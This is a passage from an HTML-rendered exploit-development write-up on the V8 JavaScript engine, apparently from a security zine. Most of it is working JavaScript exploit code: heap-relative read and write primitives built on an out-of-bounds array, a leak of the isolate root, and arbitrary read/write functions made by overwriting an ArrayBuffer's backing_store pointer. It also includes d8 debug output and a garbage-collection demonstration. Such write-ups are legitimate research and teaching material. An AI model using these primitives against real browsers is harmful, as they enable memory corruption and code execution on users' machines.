</span></span><span class="line"><span class="cl">    <span class="nx">c</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(((</span><span class="nx">flt_map</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">tmp</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">)));</span>  
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">leak</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">c</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="nx">tmp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">c</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">tmp_elm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">leak</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">weak_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">tmp</span> <span class="o">=</span> <span class="nx">b</span><span class="p">[</span><span class="mi">15</span><span class="p">];</span> <span class="c1">// accessing elements pointer of c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">b</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((((</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span><span class="o">-</span><span class="mi">8</span><span class="nx">n</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">tmp</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">c</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="nx">tmp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">weak_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">what</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">tmp</span> <span class="o">=</span> <span class="nx">b</span><span class="p">[</span><span class="mi">15</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((((</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span><span class="o">-</span><span class="mi">8</span><span class="nx">n</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">tmp</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">c</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">what</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="nx">tmp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><br />
<hr>
<h2 id="achieving-unstable-arbitrary-readwrite">Achieving Unstable Arbitrary Read/Write</h2>
<p>Unfortunately, this primitive is restricted to 8 bytes per operation to V8&rsquo;s tagged pointers, hence the <code>weak</code> prefix as these primitives are relative to V8&rsquo;s heap.</p>
<p>In order to circumvent this limitation, we will have to perform the following steps to build a stronger read/write primitive:</p>
<ul>
<li>Leak <code>isolate root</code> to resolve any V8 tagged pointer to its unboxed representation.</li>
<li>Overwrite the unboxed <code>backing_store</code> pointer of an ArrayBuffer and access it via a DataView object, enabling us to read and write memory to unboxed addresses, with sizes not limited to 8 bytes per operation.</li>
</ul>
<p>In order to leak the value of <code>isolate root</code>, we can leverage our <code>weak_read</code> primitive to leak the value of <code>external_pointer</code> from a typed array. To illustrate this, let&rsquo;s take a look at the fields of a <code>Uint8Array</code> object:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">d8</span><span class="o">&gt;</span> <span class="nx">a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="nx">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">DebugPrint</span><span class="o">:</span> <span class="mh">0x3fee080c5e69</span><span class="o">:</span> <span class="p">[</span><span class="nx">JSTypedArray</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">map</span><span class="o">:</span> <span class="mh">0x3fee082804e1</span> <span class="o">&lt;</span><span class="nx">Map</span><span class="p">(</span><span class="nx">UINT8ELEMENTS</span><span class="p">)</span><span class="o">&gt;</span> <span class="p">[</span><span class="nx">FastProperties</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">prototype</span><span class="o">:</span> <span class="mh">0x3fee082429b9</span> <span class="o">&lt;</span><span class="nb">Object</span> <span class="nx">map</span> <span class="o">=</span> <span class="mh">0x3fee08280509</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">elements</span><span class="o">:</span> <span class="mh">0x3fee080c5e59</span> <span class="o">&lt;</span><span class="nx">ByteArray</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">[</span><span class="nx">UINT8ELEMENTS</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">embedder</span> <span class="nx">fields</span><span class="o">:</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">buffer</span><span class="o">:</span> <span class="mh">0x3fee080c5e21</span> <span class="o">&lt;</span><span class="nx">ArrayBuffer</span> <span class="nx">map</span> <span class="o">=</span> <span class="mh">0x3fee08281189</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">byte_offset</span><span class="o">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">byte_length</span><span class="o">:</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">length</span><span class="o">:</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">data_ptr</span><span class="o">:</span> <span class="mh">0x3fee080c5e60</span>  <span class="o">&lt;-------------------------------</span>
</span></span><span class="line"><span class="cl">   <span class="o">-</span> <span class="nx">base_pointer</span><span class="o">:</span> <span class="mh">0x80c5e59</span>
</span></span><span class="line"><span class="cl">   <span class="o">-</span> <span class="nx">external_pointer</span><span class="o">:</span> <span class="mh">0x3fee00000007</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">properties</span><span class="o">:</span> <span class="mh">0x3fee080406e9</span> <span class="o">&lt;</span><span class="nx">FixedArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">elements</span><span class="o">:</span> <span class="mh">0x3fee080c5e59</span> <span class="o">&lt;</span><span class="nx">ByteArray</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">         <span class="mi">0</span><span class="o">-</span><span class="mi">7</span><span class="o">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">embedder</span> <span class="nx">fields</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span> <span class="nx">aligned</span> <span class="nx">pointer</span><span class="o">:</span> <span class="p">(</span><span class="nx">nil</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span> <span class="nx">aligned</span> <span class="nx">pointer</span><span class="o">:</span> <span class="p">(</span><span class="nx">nil</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x3fee082804e1</span><span class="o">:</span> <span class="p">[</span><span class="nx">Map</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">type</span><span class="o">:</span> <span class="nx">JS_TYPED_ARRAY_TYPE</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">instance</span> <span class="nx">size</span><span class="o">:</span> <span class="mi">68</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">inobject</span> <span class="nx">properties</span><span class="o">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">elements</span> <span class="nx">kind</span><span class="o">:</span> <span class="nx">UINT8ELEMENTS</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">unused</span> <span class="nx">property</span> <span class="nx">fields</span><span class="o">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="kr">enum</span> <span class="nx">length</span><span class="o">:</span> <span class="nx">invalid</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">stable_map</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">back</span> <span class="nx">pointer</span><span class="o">:</span> <span class="mh">0x3fee0804030d</span> <span class="o">&lt;</span><span class="kc">undefined</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">prototype_validity</span> <span class="nx">cell</span><span class="o">:</span> <span class="mh">0x3fee081c0451</span> <span class="o">&lt;</span><span class="nx">Cell</span> <span class="nx">value</span><span class="o">=</span> <span class="mi">1</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">instance</span> <span class="nx">descriptors</span> <span class="p">(</span><span class="nx">own</span><span class="p">)</span> <span class="err">#</span><span class="mi">0</span><span class="o">:</span> <span class="mh">0x3fee080401b5</span> <span class="o">&lt;</span><span class="nx">DescriptorArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">prototype</span><span class="o">:</span> <span class="mh">0x3fee082429b9</span> <span class="o">&lt;</span><span class="nb">Object</span> <span class="nx">map</span> <span class="o">=</span> <span class="mh">0x3fee08280509</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">constructor</span><span class="o">:</span> <span class="mh">0x3fee08242939</span> <span class="o">&lt;</span><span class="nx">JSFunction</span> <span class="nx">Uint8Array</span> <span class="p">(</span><span class="nx">sfi</span> <span class="o">=</span> <span class="mh">0x3fee081c65c1</span><span class="p">)</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">dependent</span> <span class="nx">code</span><span class="o">:</span> <span class="mh">0x3fee080401ed</span> <span class="o">&lt;</span><span class="nx">Other</span> <span class="nx">heap</span> <span class="nx">object</span> <span class="p">(</span><span class="nx">WEAK_FIXED_ARRAY_TYPE</span><span class="p">)</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">construction</span> <span class="nx">counter</span><span class="o">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="nx">d8</span><span class="o">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The value of <code>data_ptr</code>is the result of the addition of <code>base_pointer</code> and <code>external_pointer</code> and the value of <code>external_pointer</code> is ultimately the value we want. If we apply a binary mask to negate the value of the last byte of <code>external_pointer</code>, we will retrieve the value of <code>isolate root</code>&ndash; V8&rsquo;s heap base:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">root_isolate_addr</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">e</span><span class="p">))</span> <span class="o">+</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">5</span><span class="o">*</span><span class="mi">8</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">root_isolate</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">weak_read</span><span class="p">(</span><span class="nx">root_isolate_addr</span><span class="p">))</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mh">0xff</span><span class="nx">n</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">bff</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">buf_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">bff</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">backing_store_addr</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">buf_addr</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x14</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">len</span><span class="p">,</span> <span class="nx">boxed</span><span class="o">=</span><span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">boxed</span> <span class="o">&amp;&amp;</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span><span class="nx">n</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">addr</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">root_isolate</span><span class="p">)</span> <span class="o">|</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nx">weak_write</span><span class="p">(</span><span class="nx">backing_store_addr</span><span class="p">,</span> <span class="nx">addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">dataview</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="nx">bff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">len</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">result</span> <span class="o">=</span> <span class="nx">dataview</span><span class="p">.</span><span class="nx">getUint8</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">len</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">result</span> <span class="o">=</span> <span class="nx">dataview</span><span class="p">.</span><span class="nx">getUint16</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">len</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">result</span> <span class="o">=</span> <span class="nx">dataview</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">result</span> <span class="o">=</span> <span class="nx">dataview</span><span class="p">.</span><span class="nx">getBigUint64</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">val</span><span class="p">,</span> <span class="nx">len</span><span class="p">,</span> <span class="nx">boxed</span><span class="o">=</span><span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">boxed</span> <span class="o">&amp;&amp;</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span><span class="nx">n</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">addr</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">root_isolate</span><span class="p">)</span> <span class="o">|</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nx">weak_write</span><span class="p">(</span><span class="nx">backing_store_addr</span><span class="p">,</span> <span class="nx">addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">dataview</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="nx">bff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">len</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">dataview</span><span class="p">.</span><span class="nx">setUint8</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">val</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">len</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">dataview</span><span class="p">.</span><span class="nx">setUint16</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">val</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">len</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">dataview</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">val</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">dataview</span><span class="p">.</span><span class="nx">setBigUint64</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">val</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><br />
<hr>
<h2 id="achieving-stable-arbitrary-readwrite">Achieving Stable Arbitrary Read/Write</h2>
<p>Browsers heavily rely on features such as Garbage Collection in order to autonomously free orphan objects (objects that are not being referenced by any other object).</p>
<p>However, we will soon cover how this introduces reliability issues in our exploit.
This paper will not be covering V8 Garbage Collection internals extensively as it is a broad subject, but I highly encourage reading <a href="https://v8.dev/blog/trash-talk">this</a> reference of Orinoco (V8 GC) and <a href="https://deepu.tech/memory-management-in-v8/">this</a> on V8 memory management as an initial introduction to the subject.</p>
<p>In summary, the V8 heap is split into generations, and objects are moved through these generations if they survive a GC:</p>
<div style="text-align:center"><img src ="https://v8.dev/_img/trash-talk/02.svg" /></div>
<p>In order to showcase an example of reliability problems introduced by the garbage collector, lets showcase Orinoco&rsquo;s Minor GC, also known as Scavenge which is in charge of garbage-collecting the Young generation. When this GC takes place, live objects get moved from <code>from-space</code> to <code>to-space</code> within V8&rsquo;s Young Generation heap:</p>
<div style="text-align:center"><img src ="https://tmpout.sh/2/img/2022-02-16_22-27.png" /></div>
<p>In order to illustrate this, let&rsquo;s run the following script:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">force_gc</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x80000</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">oob</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="p">[{},</span> <span class="p">{}];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">b</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">d</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Forcing GC...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">force_gc</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">b</span><span class="p">);</span>
